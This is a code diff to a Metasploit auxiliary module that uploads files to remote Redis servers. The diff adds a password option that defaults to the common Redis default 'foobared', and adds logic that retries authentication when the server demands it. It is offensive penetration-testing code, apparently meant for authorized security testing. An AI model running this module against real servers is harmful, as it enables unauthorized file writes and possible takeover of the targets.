@@ -12,10 +12,15 @@ class Metasploit3 < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'          => 'Redis Unauthenticated File Upload',
+        'Name'          => 'Redis File Upload',
         'Description'   => %q(
-          This module can save data to file in remote redis server,
-          Because redis is unprotected without a password set up.
+          This module can be used to leverage functionality exposed by Redis to
+          achieve somewhat arbitrary file upload to a file and directory to
+          which the user account running the redis instance has access.  It is
+          not totally arbitrary because the exact contents of the file cannot
+          (yet) be completely controlled.  Depending on the contents of the
+          file that is being uploaded, Redis may compress the data that is
+          ultimately stored in the specified target location.
         ),
         'License'       => MSF_LICENSE,
         'Author'        => [
@@ -34,10 +39,12 @@ class Metasploit3 < Msf::Auxiliary
         'DisclosureDate' => 'Nov 11 2015'
       )
     )
+
     register_options(
       [
         OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
-        OptString.new('RemoteFile', [false, 'Remote file path'])
+        OptString.new('RemoteFile', [false, 'Remote file path']),
+        OptString.new('Password', [false, 'Redis password for authentication test', 'foobared'])
       ]
     )
   end
@@ -84,6 +91,9 @@ class Metasploit3 < Msf::Auxiliary
   def check
     connect
     data = send_redis_command('INFO')
+    if data && /NOAUTH Authentication required/ =~ data
+      data = send_redis_command('INFO') if redis_auth?(datastore['Password'])
+    end
     disconnect
     if data && /redis_version:(?<redis_version>\S+)/ =~ data
       report_redis(redis_version)
@@ -128,6 +138,9 @@ class Metasploit3 < Msf::Auxiliary
 
     if res =~ /PONG/
       vprint_good("#{peer} -- responded positively to our PONG")
+      send_file(datastore['RemoteFile'], @upload_content)
+    elsif res =~ /NOAUTH Authentication required/ && redis_auth?(datastore['Password'])
+      vprint_good("#{peer} -- responded to auth successfully")
       send_file(datastore['RemoteFile'], @upload_content)
     else
       vprint_good("#{peer} -- responded unknown to our PONG: #{res}")
